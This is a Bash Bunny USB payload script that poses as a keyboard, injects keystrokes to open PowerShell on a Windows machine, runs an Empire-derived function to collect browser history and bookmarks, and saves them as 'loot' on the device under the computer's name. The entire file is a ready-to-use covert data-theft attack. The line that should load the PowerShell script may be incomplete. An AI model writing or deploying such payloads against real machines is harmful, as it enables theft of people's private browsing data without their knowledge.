#!/bin/bash
#
# Title:         BrowserData
# Author:        zachstanford
# Version:       0.1
#
# Dumps browser info like history and bookmarks from local ps1 file 
# then saves them in /root/udisk/loot/BrowserData/%ComputerName%
# Credits to this Empire's powershell script:
# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1

#script 
# Blue...............Running Script
# Purple.............Finished


LED R 200
LOOTDIR=/root/udisk/loot/BrowserData
mkdir -p $LOOTDIR

ATTACKMODE HID STORAGE
LED B 200

# wait 6 seconds for the storage to popup
Q DELAY 6000
Q GUI r
Q DELAY 100
Q STRING POWERSHELL
Q ENTER
Q DELAY 500
Q STRING $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
Q ENTER
Q DELAY 100
Q STRING (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\$SWITCH_POSITION\Get-BrowserData.ps1'; Get-BrowserInformation | Out-File $Bunny\loot\BrowserData\$env:computername.txt;
Q ENTER
Q DELAY 2000
Q STRING exit
Q ENTER
sync
LED R B 200